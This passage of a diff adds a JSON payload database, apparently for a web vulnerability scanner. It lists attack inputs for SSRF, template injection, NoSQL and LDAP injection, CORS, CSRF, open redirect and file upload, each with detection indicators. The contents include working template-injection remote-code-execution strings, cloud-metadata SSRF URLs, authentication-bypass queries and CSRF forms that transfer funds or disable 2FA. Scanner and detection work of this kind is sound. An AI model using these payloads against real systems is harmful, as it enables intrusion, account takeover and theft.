+          "payload": "dict://127.0.0.1:11211/stats",
+          "encoding": "none",
+          "type": "dict_memcached"
+        },
+        {
+          "payload": "http://[::1]/admin",
+          "encoding": "none",
+          "type": "ipv6_loopback"
+        },
+        {
+          "payload": "http://2130706433/admin",
+          "encoding": "none",
+          "type": "decimal_ip_bypass"
+        },
+        {
+          "payload": "http://0x7f000001/admin",
+          "encoding": "none",
+          "type": "hex_ip_bypass"
+        },
+        {
+          "payload": "http://shld.io/SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "oob_callback"
+        },
+        {
+          "payload": "http://127.1/SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "short_loopback"
+        },
+        {
+          "payload": "http://127.0.0.1%09/SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "tab_bypass"
+        },
+        {
+          "payload": "http://127.0.0.1/SHLD{{MARKER}}/../admin",
+          "encoding": "none",
+          "type": "path_traversal_ssrf"
+        },
+        {
+          "payload": "https://shld.io/SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "oob_https"
+        },
+        {
+          "payload": "http://169.254.169.254/latest/meta-data/",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "http://shld.io/SHLD{{MARKER}}",
+          "encoding": "base64",
+          "type": "base64_encoded"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "string",
+            "value": "ami-id"
+          },
+          {
+            "type": "string",
+            "value": "instance-id"
+          },
+          {
+            "type": "string",
+            "value": "local-ipv4"
+          },
+          {
+            "type": "string",
+            "value": "iam/security-credentials"
+          },
+          {
+            "type": "string",
+            "value": "computeMetadata"
+          },
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "string",
+            "value": "shld.io"
+          },
+          {
+            "type": "regex",
+            "value": "root:x:0:0:root"
+          },
+          {
+            "type": "string",
+            "value": "+PONG"
+          },
+          {
+            "type": "regex",
+            "value": "health.*\"status\":"
+          },
+          {
+            "type": "string",
+            "value": "google/compute/v1"
+          },
+          {
+            "type": "regex",
+            "value": "169\\.254\\.169\\.254"
+          }
+        ],
+        "delay_based": true
+      }
+    },
+    "SSTI": {
+      "name_abbr": "SSTI",
+      "name_full": "server_side_template_injection",
+      "severity": "critical",
+      "cvss_base": 9.8,
+      "injection_points": [
+        "query",
+        "form",
+        "header"
+      ],
+      "payloads": [
+        {
+          "payload": "{{1337*1337}}SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "math_probe_jinja2"
+        },
+        {
+          "payload": "${1337*1337}SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "math_probe_freemarker"
+        },
+        {
+          "payload": "#{1337*1337}SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "math_probe_ruby"
+        },
+        {
+          "payload": "<%= 1337*1337 %>SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "math_probe_erb"
+        },
+        {
+          "payload": "*{1337*1337}SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "math_probe_spring"
+        },
+        {
+          "payload": "{{7*'SHLD{{MARKER}}'}}",
+          "encoding": "none",
+          "type": "twig_multiplication_probe"
+        },
+        {
+          "payload": "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "jinja2_rce"
+        },
+        {
+          "payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('echo SHLD{{MARKER}};id').read()}}",
+          "encoding": "none",
+          "type": "jinja2_globals_rce"
+        },
+        {
+          "payload": "{%for c in [].__class__.__base__.__subclasses__()%}{%if 'catch_warnings' in c.__name__%}{{c()._module.__builtins__['__import__']('os').system('echo SHLD{{MARKER}}')}}{%endif%}{%endfor%}",
+          "encoding": "none",
+          "type": "jinja2_catch_warnings"
+        },
+        {
+          "payload": "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('echo SHLD{{MARKER}};id')}}",
+          "encoding": "none",
+          "type": "twig_rce"
+        },
+        {
+          "payload": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('echo SHLD{{MARKER}};id')}",
+          "encoding": "none",
+          "type": "freemarker_rce"
+        },
+        {
+          "payload": "#set($cmd='echo SHLD{{MARKER}};id')#set($ex=$class.forName('java.lang.Runtime').getRuntime())#set($x=$ex.exec($cmd))#set($oe=$x.inputStream)#set($out=$class.forName('java.io.PrintWriter').getConstructor($class.forName('java.io.OutputStream')).newInstance($oe))",
+          "encoding": "none",
+          "type": "velocity_rce"
+        },
+        {
+          "payload": "{system('echo SHLD{{MARKER}};id')}SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "smarty_rce"
+        },
+        {
+          "payload": "{php}echo shell_exec('echo SHLD{{MARKER}};id');{/php}",
+          "encoding": "none",
+          "type": "smarty_php"
+        },
+        {
+          "payload": "<%= `echo SHLD{{MARKER}}; id` %>",
+          "encoding": "none",
+          "type": "erb_backtick"
+        },
+        {
+          "payload": "${'SHLD{{MARKER}}'.concat(7*7)}",
+          "encoding": "none",
+          "type": "groovy_probe"
+        },
+        {
+          "payload": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('echo SHLD{{MARKER}};id')\")()}}",
+          "encoding": "none",
+          "type": "angular_rce"
+        },
+        {
+          "payload": "{% import os %}{{os.popen('echo SHLD{{MARKER}};id').read()}}",
+          "encoding": "none",
+          "type": "mako_rce"
+        },
+        {
+          "payload": "{{7*7}}${7*7}<%=7*7%>#{ 7 * 7 }SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "polyglot_probe"
+        },
+        {
+          "payload": "{{1337*1337}}SHLD{{MARKER}}",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "{{1337*1337}}SHLD{{MARKER}}",
+          "encoding": "html",
+          "type": "html_encoded"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "string",
+            "value": "1787569"
+          },
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "regex",
+            "value": "uid=\\d+\\([a-z_]+\\) gid=\\d+"
+          },
+          {
+            "type": "string",
+            "value": "jinja2.exceptions.UndefinedError"
+          },
+          {
+            "type": "string",
+            "value": "jinja2.exceptions.TemplateSyntaxError"
+          },
+          {
+            "type": "string",
+            "value": "FreeMarker template error"
+          },
+          {
+            "type": "string",
+            "value": "freemarker.core.ParseException"
+          },
+          {
+            "type": "string",
+            "value": "Smarty error:"
+          },
+          {
+            "type": "string",
+            "value": "TemplateSyntaxError"
+          },
+          {
+            "type": "regex",
+            "value": "7777777|SHLD7777777"
+          },
+          {
+            "type": "regex",
+            "value": "org\\.apache\\.velocity\\.exception"
+          },
+          {
+            "type": "string",
+            "value": "GrailsException"
+          }
+        ],
+        "delay_based": false
+      }
+    },
+    "NoSQLi": {
+      "name_abbr": "NoSQLi",
+      "name_full": "nosql_injection",
+      "severity": "high",
+      "cvss_base": 7.5,
+      "injection_points": [
+        "query",
+        "form",
+        "body"
+      ],
+      "payloads": [
+        {
+          "payload": "{\"$ne\": \"SHLD{{MARKER}}\"}",
+          "encoding": "none",
+          "type": "mongodb_ne"
+        },
+        {
+          "payload": "{\"$gt\": \"\"}",
+          "encoding": "none",
+          "type": "mongodb_gt"
+        },
+        {
+          "payload": "{\"$regex\": \"^SHLD{{MARKER}}.*\"}",
+          "encoding": "none",
+          "type": "mongodb_regex_marker"
+        },
+        {
+          "payload": "{\"$where\": \"return this.password.match(/SHLD{{MARKER}}/) || true\"}",
+          "encoding": "none",
+          "type": "mongodb_where_js"
+        },
+        {
+          "payload": "{\"$or\": [{\"username\": \"admin\"}, {\"SHLD{{MARKER}}\": 1}]}",
+          "encoding": "none",
+          "type": "mongodb_or"
+        },
+        {
+          "payload": "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": \"SHLD{{MARKER}}\"}}",
+          "encoding": "none",
+          "type": "mongodb_auth_bypass"
+        },
+        {
+          "payload": "{\"username\": {\"$regex\": \"^admin\", \"$options\": \"i\"}, \"password\": {\"$ne\": \"SHLD{{MARKER}}\"}}",
+          "encoding": "none",
+          "type": "mongodb_regex_auth"
+        },
+        {
+          "payload": "{\"$where\": \"sleep(7000) || 'SHLD{{MARKER}}'\"}",
+          "encoding": "none",
+          "type": "mongodb_time_blind"
+        },
+        {
+          "payload": "{\"password\": {\"$in\": [\"admin\", \"password\", \"SHLD{{MARKER}}\"]}}",
+          "encoding": "none",
+          "type": "mongodb_in_array"
+        },
+        {
+          "payload": "{\"$expr\": {\"$gt\": [\"$salary\", 0]}}",
+          "encoding": "none",
+          "type": "mongodb_expr"
+        },
+        {
+          "payload": "' || this.password.match(/SHLD{{MARKER}}/) || 'x'=='y",
+          "encoding": "none",
+          "type": "json_nosqli"
+        },
+        {
+          "payload": "{\"$lookup\": {\"from\": \"users\", \"localField\": \"SHLD{{MARKER}}\", \"as\": \"data\"}}",
+          "encoding": "none",
+          "type": "mongodb_lookup"
+        },
+        {
+          "payload": "username[$ne]=SHLD{{MARKER}}&password[$ne]=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "query_operator"
+        },
+        {
+          "payload": "{\"username\": {\"$elemMatch\": {\"$gt\": \"SHLD{{MARKER}}\"}}}",
+          "encoding": "none",
+          "type": "mongodb_elemmatch"
+        },
+        {
+          "payload": "[\"$where\", \"'SHLD{{MARKER}}'.length > 0\"]",
+          "encoding": "none",
+          "type": "couchdb_like"
+        },
+        {
+          "payload": "{\"key\": {\"$gt\": \"SHLD{{MARKER}}\", \"$lt\": \"z\"}}",
+          "encoding": "none",
+          "type": "range_probe"
+        },
+        {
+          "payload": "{\"$where\": \"Object.keys(this).indexOf('SHLD{{MARKER}}') >= 0\"}",
+          "encoding": "none",
+          "type": "key_exfil"
+        },
+        {
+          "payload": "{\"username\": \"admin\", \"$comment\": \"SHLD{{MARKER}}\"}",
+          "encoding": "none",
+          "type": "comment_probe"
+        },
+        {
+          "payload": "{\"$ne\": \"SHLD{{MARKER}}\"}",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "{\"$ne\": \"SHLD{{MARKER}}\"}",
+          "encoding": "base64",
+          "type": "base64_encoded"
+        },
+        {
+          "payload": "{\"$ne\": \"SHLD{{MARKER}}\"}",
+          "encoding": "html",
+          "type": "html_encoded"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "regex",
+            "value": "MongoServerError:"
+          },
+          {
+            "type": "string",
+            "value": "MongoError:"
+          },
+          {
+            "type": "string",
+            "value": "CastError: Cast to ObjectId failed"
+          },
+          {
+            "type": "string",
+            "value": "BSONTypeError:"
+          },
+          {
+            "type": "regex",
+            "value": "unknown operator: \\$"
+          },
+          {
+            "type": "string",
+            "value": "Unrecognized expression"
+          },
+          {
+            "type": "string",
+            "value": "$where is not allowed"
+          },
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "regex",
+            "value": "validation.*failed"
+          },
+          {
+            "type": "string",
+            "value": "DocumentDB"
+          },
+          {
+            "type": "regex",
+            "value": "firestore.*invalid"
+          },
+          {
+            "type": "string",
+            "value": "DynamoDB"
+          }
+        ],
+        "delay_based": false
+      }
+    },
+    "LDAPi": {
+      "name_abbr": "LDAPi",
+      "name_full": "ldap_injection",
+      "severity": "high",
+      "cvss_base": 7.5,
+      "injection_points": [
+        "query",
+        "form"
+      ],
+      "payloads": [
+        {
+          "payload": "*)(uid=*)(|(uid=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "filter_bypass"
+        },
+        {
+          "payload": "admin*)(|(cn=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "wildcard_bypass"
+        },
+        {
+          "payload": "*)(objectClass=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "objectclass_probe"
+        },
+        {
+          "payload": "*)(|(uid=*)(uid=SHLD{{MARKER}})",
+          "encoding": "none",
+          "type": "or_injection"
+        },
+        {
+          "payload": "admin)(&(password=SHLD{{MARKER}})(objectClass=*",
+          "encoding": "none",
+          "type": "and_bypass"
+        },
+        {
+          "payload": "SHLD{{MARKER}}*)(uid=*",
+          "encoding": "none",
+          "type": "prefix_wildcard"
+        },
+        {
+          "payload": "*)(cn=*)(!(cn=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "not_filter"
+        },
+        {
+          "payload": ")(|(objectClass=*)(cn=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "objectclass_any"
+        },
+        {
+          "payload": "*)(&(objectClass=person)(userPassword=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "blind_attr"
+        },
+        {
+          "payload": "*)(mail=SHLD{{MARKER}}@*)(|(uid=*",
+          "encoding": "none",
+          "type": "mail_probe"
+        },
+        {
+          "payload": "\\2a)(uid=*)(|(uid=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "escape_bypass"
+        },
+        {
+          "payload": "*)(dc=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "dc_probe"
+        },
+        {
+          "payload": "SHLD{{MARKER}};objectClass=*",
+          "encoding": "none",
+          "type": "semicolon_bypass"
+        },
+        {
+          "payload": "*%00)(uid=*)(|(uid=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "null_byte_bypass"
+        },
+        {
+          "payload": "admin)(|(cn=SHLD{{MARKER}})(userPassword=*",
+          "encoding": "none",
+          "type": "or_password_probe"
+        },
+        {
+          "payload": "*)(|(uid=SHLD{{MARKER}})(sAMAccountName=admin",
+          "encoding": "none",
+          "type": "samaccount_probe"
+        },
+        {
+          "payload": "SHLD{{MARKER}}\\29\\28objectClass=*",
+          "encoding": "none",
+          "type": "hex_escape"
+        },
+        {
+          "payload": "*)(distinguishedName=*SHLD{{MARKER}}*",
+          "encoding": "none",
+          "type": "dn_probe"
+        },
+        {
+          "payload": "*)(uid=*)(|(uid=SHLD{{MARKER}}",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "*)(uid=*)(|(uid=SHLD{{MARKER}}",
+          "encoding": "base64",
+          "type": "base64_encoded"
+        },
+        {
+          "payload": "*)(memberOf=CN=SHLD{{MARKER}},OU=Groups,DC=corp,DC=local",
+          "encoding": "none",
+          "type": "memberof_probe"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "string",
+            "value": "LDAP Result Code 2"
+          },
+          {
+            "type": "string",
+            "value": "ldap_search_s() failed"
+          },
+          {
+            "type": "string",
+            "value": "ldap_bind() failed"
+          },
+          {
+            "type": "string",
+            "value": "javax.naming.NamingException"
+          },
+          {
+            "type": "string",
+            "value": "javax.naming.directory.InvalidSearchFilterException"
+          },
+          {
+            "type": "string",
+            "value": "System.DirectoryServices.DirectoryServicesCOMException"
+          },
+          {
+            "type": "string",
+            "value": "Invalid filter syntax"
+          },
+          {
+            "type": "string",
+            "value": "Bad search filter"
+          },
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "regex",
+            "value": "LDAP.*error.*code"
+          },
+          {
+            "type": "string",
+            "value": "com.unboundid.ldap"
+          },
+          {
+            "type": "regex",
+            "value": "net\\.ldap\\.LDAP"
+          }
+        ],
+        "delay_based": false
+      }
+    },
+    "CORS": {
+      "name_abbr": "CORS",
+      "name_full": "cors_misconfiguration",
+      "severity": "medium",
+      "cvss_base": 6.5,
+      "injection_points": [
+        "header"
+      ],
+      "payloads": [
+        {
+          "payload": "https://shld-SHLD{{MARKER}}.io",
+          "encoding": "none",
+          "type": "origin_marker"
+        },
+        {
+          "payload": "http://attacker-SHLD{{MARKER}}.com",
+          "encoding": "none",
+          "type": "origin_reflection"
+        },
+        {
+          "payload": "https://attacker.com",
+          "encoding": "none",
+          "type": "origin_basic"
+        },
+        {
+          "payload": "null",
+          "encoding": "none",
+          "type": "null_origin"
+        },
+        {
+          "payload": "http://evil.target.com.SHLD{{MARKER}}.attacker.com",
+          "encoding": "none",
+          "type": "subdomain_bypass"
+        },
+        {
+          "payload": "http://SHLD{{MARKER}}.target.com.attacker.com",
+          "encoding": "none",
+          "type": "prefix_bypass"
+        },
+        {
+          "payload": "https://target.com.SHLD{{MARKER}}.attacker.com",
+          "encoding": "none",
+          "type": "suffix_bypass"
+        },
+        {
+          "payload": "http://SHLD{{MARKER}}-allowed.legit.com",
+          "encoding": "none",
+          "type": "partial_match_probe"
+        },
+        {
+          "payload": "https://SHLD{{MARKER}}notexist.target.com",
+          "encoding": "none",
+          "type": "arbitrary_subdomain"
+        },
+        {
+          "payload": "http://localhost:3000",
+          "encoding": "none",
+          "type": "localhost_port"
+        },
+        {
+          "payload": "http://127.0.0.1:8080",
+          "encoding": "none",
+          "type": "loopback_port"
+        },
+        {
+          "payload": "file://SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "file_protocol"
+        },
+        {
+          "payload": "https://SHLD{{MARKER}}.xn--h28h.com",
+          "encoding": "none",
+          "type": "unicode_domain"
+        },
+        {
+          "payload": "http://attacker.SHLD{{MARKER}}.com.br",
+          "encoding": "none",
+          "type": "ccTLD_bypass"
+        },
+        {
+          "payload": "http://x.SHLD{{MARKER}}.attacker.io",
+          "encoding": "none",
+          "type": "subdomain_wildcard"
+        },
+        {
+          "payload": "https://attacker.com%60SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "backtick_bypass"
+        },
+        {
+          "payload": "https://attack\u0435r-SHLD{{MARKER}}.com",
+          "encoding": "none",
+          "type": "homoglyph"
+        },
+        {
+          "payload": "http://SHLD{{MARKER}}.burpcollaborator.net",
+          "encoding": "none",
+          "type": "collaborator_probe"
+        },
+        {
+          "payload": "https://shld-SHLD{{MARKER}}.io",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "https://shld-SHLD{{MARKER}}.io",
+          "encoding": "html",
+          "type": "html_encoded"
+        },
+        {
+          "payload": "https://shld-SHLD{{MARKER}}.io",
+          "encoding": "base64",
+          "type": "base64_encoded"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "regex",
+            "value": "Access-Control-Allow-Origin:\\s*https?://shld"
+          },
+          {
+            "type": "regex",
+            "value": "Access-Control-Allow-Origin:\\s*https?://attacker"
+          },
+          {
+            "type": "string",
+            "value": "Access-Control-Allow-Origin: null"
+          },
+          {
+            "type": "string",
+            "value": "Access-Control-Allow-Credentials: true"
+          },
+          {
+            "type": "string",
+            "value": "Access-Control-Allow-Origin: *"
+          },
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "regex",
+            "value": "Access-Control-Allow-Origin:\\s*http://localhost"
+          },
+          {
+            "type": "regex",
+            "value": "Access-Control-Allow-Origin:\\s*null"
+          },
+          {
+            "type": "regex",
+            "value": "Access-Control-Allow-Methods:.*DELETE"
+          },
+          {
+            "type": "regex",
+            "value": "Access-Control-Expose-Headers:"
+          },
+          {
+            "type": "regex",
+            "value": "Vary:.*Origin"
+          },
+          {
+            "type": "string",
+            "value": "Access-Control-Allow-Headers: Authorization"
+          }
+        ],
+        "delay_based": false
+      }
+    },
+    "CSRF": {
+      "name_abbr": "CSRF",
+      "name_full": "cross-site_request_forgery",
+      "severity": "medium",
+      "cvss_base": 6.5,
+      "injection_points": [
+        "form"
+      ],
+      "payloads": [
+        {
+          "payload": "<img src='https://target.com/api/transfer?to=attacker&amount=9999&ref=SHLD{{MARKER}}' style='display:none'>",
+          "encoding": "none",
+          "type": "get_img"
+        },
+        {
+          "payload": "<img src='https://target.com/api/account/delete?confirm=1&t=SHLD{{MARKER}}' width=0 height=0>",
+          "encoding": "none",
+          "type": "get_delete"
+        },
+        {
+          "payload": "<form id='f' action='https://target.com/api/email/update' method='POST'><input name='email' value='attacker@evil.com'><input name='ref' value='SHLD{{MARKER}}'></form><script>document.getElementById('f').submit();</script>",
+          "encoding": "none",
+          "type": "post_form"
+        },
+        {
+          "payload": "<iframe style='display:none' name='csrf-frame'></iframe><form target='csrf-frame' action='https://target.com/api/password/reset' method='POST'><input name='password' value='hacked123'><input name='ref' value='SHLD{{MARKER}}'></form><script>document.forms[0].submit();</script>",
+          "encoding": "none",
+          "type": "iframe_post"
+        },
+        {
+          "payload": "<script>fetch('https://target.com/api/admin/action', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'grant_admin', ref:'SHLD{{MARKER}}'})})</script>",
+          "encoding": "none",
+          "type": "fetch_json"
+        },
+        {
+          "payload": "<script>var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/settings');xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('setting=malicious&ref=SHLD{{MARKER}}');</script>",
+          "encoding": "none",
+          "type": "xhr_post"
+        },
+        {
+          "payload": "<form method='POST' action='https://target.com/api/users/promote' enctype='text/plain'><input name='{\"role\":\"admin\",\"ref\":\"SHLD{{MARKER}}' value='\"}'>",
+          "encoding": "none",
+          "type": "json_csrf_text_plain"
+        },
+        {
+          "payload": "<link rel='prefetch' href='https://target.com/api/admin/export?ref=SHLD{{MARKER}}'>",
+          "encoding": "none",
+          "type": "prefetch_get"
+        },
+        {
+          "payload": "<script>navigator.sendBeacon('https://target.com/api/track', JSON.stringify({event:'SHLD{{MARKER}}', action:'escalate'}));</script>",
+          "encoding": "none",
+          "type": "beacon_post"
+        },
+        {
+          "payload": "<base href='https://target.com/'><form method='POST' action='api/admin'><input name='cmd' value='SHLD{{MARKER}}'></form><script>document.forms[0].submit()</script>",
+          "encoding": "none",
+          "type": "base_tag"
+        },
+        {
+          "payload": "<form action='https://target.com/api/webhook' method='POST'><input name='url' value='https://shld.io/SHLD{{MARKER}}'></form><script>document.forms[0].submit()</script>",
+          "encoding": "none",
+          "type": "ssrf_via_csrf"
+        },
+        {
+          "payload": "<script>history.pushState('','','/');document.forms[0].submit();</script><form action='https://target.com/login' method='POST'><input name='username' value='admin'><input name='token' value='SHLD{{MARKER}}'></form>",
+          "encoding": "none",
+          "type": "login_csrf"
+        },
+        {
+          "payload": "<img src=x onerror=\"var f=document.createElement('form');f.action='https://target.com/api/2fa/disable';f.method='POST';var i=document.createElement('input');i.name='ref';i.value='SHLD{{MARKER}}';f.append(i);document.body.append(f);f.submit()\">",
+          "encoding": "none",
+          "type": "img_onerror_form"
+        },
+        {
+          "payload": "<form action='https://target.com/api/profile' method='POST' id='x'><input name='avatar' value='https://shld.io/SHLD{{MARKER}}'></form><script>document.getElementById('x').submit()</script>",
+          "encoding": "none",
+          "type": "profile_update"
+        },
+        {
+          "payload": "<form method='POST' action='https://target.com/api/keys/revoke'><input name='key_id' value='1'><input name='ref' value='SHLD{{MARKER}}'></form><script>document.forms[0].submit()</script>",
+          "encoding": "none",
+          "type": "api_key_revoke"
+        },
+        {
+          "payload": "<form enctype='multipart/form-data' method='POST' action='https://target.com/upload'><input type='file' name='file'><input name='ref' value='SHLD{{MARKER}}'></form>",
+          "encoding": "none",
+          "type": "file_upload_csrf"
+        },
+        {
+          "payload": "<script>fetch('https://target.com/api/graphql',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:'{\"query\":\"mutation{deleteUser(id:1)}\",\"ref\":\"SHLD{{MARKER}}\"}'})</script>",
+          "encoding": "none",
+          "type": "graphql_mutation_csrf"
+        },
+        {
+          "payload": "<form action='https://target.com/api/otp/disable' method='POST'><input name='password' value='oldpass'><input name='confirm' value='SHLD{{MARKER}}'></form><script>document.forms[0].submit()</script>",
+          "encoding": "none",
+          "type": "otp_disable"
+        },
+        {
+          "payload": "<script>fetch('https://target.com/api/transfer?to=attacker&amount=9999&ref=SHLD{{MARKER}}', {credentials:'include'})</script>",
+          "encoding": "none",
+          "type": "get_fetch_credentials"
+        },
+        {
+          "payload": "<object data='https://target.com/api/session/extend?ref=SHLD{{MARKER}}'></object>",
+          "encoding": "none",
+          "type": "object_get"
+        },
+        {
+          "payload": "<form method='POST' action='https://target.com/api/email/update'><input name='email' value='attacker@evil.com'><input name='ref' value='SHLD{{MARKER}}'></form><script>document.forms[0].submit();</script>",
+          "encoding": "url",
+          "type": "url_encoded"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "string",
+            "value": "CSRF token missing"
+          },
+          {
+            "type": "string",
+            "value": "CSRF token invalid"
+          },
+          {
+            "type": "string",
+            "value": "Forbidden: CSRF verification failed"
+          },
+          {
+            "type": "string",
+            "value": "csrfmiddlewaretoken"
+          },
+          {
+            "type": "string",
+            "value": "X-CSRFToken"
+          },
+          {
+            "type": "regex",
+            "value": "Invalid.*CSRF.*token"
+          },
+          {
+            "type": "regex",
+            "value": "Set-Cookie:.*csrf"
+          },
+          {
+            "type": "regex",
+            "value": "HTTP/1\\.[01] 302"
+          },
+          {
+            "type": "string",
+            "value": "action completed"
+          },
+          {
+            "type": "regex",
+            "value": "transfer.*success"
+          },
+          {
+            "type": "string",
+            "value": "shld.io"
+          }
+        ],
+        "delay_based": false
+      }
+    },
+    "OpenRedirect": {
+      "name_abbr": "OpenRedirect",
+      "name_full": "open_redirect",
+      "severity": "medium",
+      "cvss_base": 6.1,
+      "injection_points": [
+        "query",
+        "form"
+      ],
+      "payloads": [
+        {
+          "payload": "https://shld-SHLD{{MARKER}}.io",
+          "encoding": "none",
+          "type": "https_marker"
+        },
+        {
+          "payload": "//shld-SHLD{{MARKER}}.io",
+          "encoding": "none",
+          "type": "protocol_relative"
+        },
+        {
+          "payload": "https://shld-SHLD{{MARKER}}.io@target.com",
+          "encoding": "none",
+          "type": "at_sign_bypass"
+        },
+        {
+          "payload": "https://target.com.shld-SHLD{{MARKER}}.io",
+          "encoding": "none",
+          "type": "suffix_bypass"
+        },
+        {
+          "payload": "https://target.com%40shld-SHLD{{MARKER}}.io",
+          "encoding": "none",
+          "type": "encoded_at"
+        },
+        {
+          "payload": "///shld-SHLD{{MARKER}}.io",
+          "encoding": "none",
+          "type": "triple_slash"
+        },
+        {
+          "payload": "////shld-SHLD{{MARKER}}.io",
+          "encoding": "none",
+          "type": "quad_slash"
+        },
+        {
+          "payload": "https:shld-SHLD{{MARKER}}.io",
+          "encoding": "none",
+          "type": "colon_no_slash"
+        },
+        {
+          "payload": "https://shld-SHLD{{MARKER}}.io%3F.target.com",
+          "encoding": "none",
+          "type": "question_bypass"
+        },
+        {
+          "payload": "https://shld-SHLD{{MARKER}}.io#.target.com",
+          "encoding": "none",
+          "type": "hash_bypass"
+        },
+        {
+          "payload": "javascript:window.location='https://shld-SHLD{{MARKER}}.io'",
+          "encoding": "none",
+          "type": "js_proto"
+        },
+        {
+          "payload": "https://shld-SHLD{{MARKER}}.io\\@target.com",
+          "encoding": "none",
+          "type": "backslash_at"
+        },
+        {
+          "payload": "https://shld-SHLD{{MARKER}}.io%0d%0aLocation:https://shld-SHLD{{MARKER}}.io",
+          "encoding": "none",
+          "type": "crlf_in_redirect"
+        },
+        {
+          "payload": "https://shld-SHLD{{MARKER}}.io%09.target.com",
+          "encoding": "none",
+          "type": "tab_bypass"
+        },
+        {
+          "payload": "/\\/shld-SHLD{{MARKER}}.io",
+          "encoding": "none",
+          "type": "slash_backslash"
+        },
+        {
+          "payload": "/%5cshld-SHLD{{MARKER}}.io",
+          "encoding": "none",
+          "type": "backslash_encoded"
+        },
+        {
+          "payload": "https://shld-SHLD{{MARKER}}.io%252f.target.com",
+          "encoding": "none",
+          "type": "double_url_encode"
+        },
+        {
+          "payload": "https://shld-SHLD{{MARKER}}.io\u2044target.com",
+          "encoding": "none",
+          "type": "fraction_slash"
+        },
+        {
+          "payload": "https://shld-SHLD{{MARKER}}.io",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "https://shld-SHLD{{MARKER}}.io",
+          "encoding": "html",
+          "type": "html_encoded"
+        },
+        {
+          "payload": "https://shld-SHLD{{MARKER}}.io",
+          "encoding": "base64",
+          "type": "base64_encoded"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "regex",
+            "value": "Location:\\s*https?://shld"
+          },
+          {
+            "type": "regex",
+            "value": "Location:\\s*//shld"
+          },
+          {
+            "type": "regex",
+            "value": "Location:\\s*https?://attacker"
+          },
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "regex",
+            "value": "HTTP/1\\.[01] 30[12]"
+          },
+          {
+            "type": "regex",
+            "value": "Refresh:\\s*\\d+;url=https?://shld"
+          },
+          {
+            "type": "string",
+            "value": "shld.io"
+          },
+          {
+            "type": "regex",
+            "value": "window\\.location.*=.*shld"
+          },
+          {
+            "type": "regex",
+            "value": "meta.*refresh.*shld"
+          },
+          {
+            "type": "regex",
+            "value": "Location:\\s*/\\\\/"
+          },
+          {
+            "type": "regex",
+            "value": "Location:\\s*javascript:"
+          },
+          {
+            "type": "regex",
+            "value": "Location:.*%40shld"
+          }
+        ],
+        "delay_based": false
+      }
+    },
+    "InsecUpload": {
+      "name_abbr": "InsecUpload",
+      "name_full": "insecure_file_upload",
+      "severity": "critical",
+      "cvss_base": 9.8,
+      "injection_points": [
+        "form"
+      ],
+      "payloads": [
+        {
+          "payload": "SHLD{{MARKER}}.php",
+          "encoding": "none",
+          "type": "php_shell_marker"
+        },
+        {
+          "payload": "SHLD{{MARKER}}.php5",
+          "encoding": "none",
+          "type": "php5_shell"
+        },
+        {
+          "payload": "SHLD{{MARKER}}.phtml",
+          "encoding": "none",
+          "type": "phtml_shell"
+        },
+        {
+          "payload": "SHLD{{MARKER}}.phar",
+          "encoding": "none",
+          "type": "phar_shell"
+        },
+        {
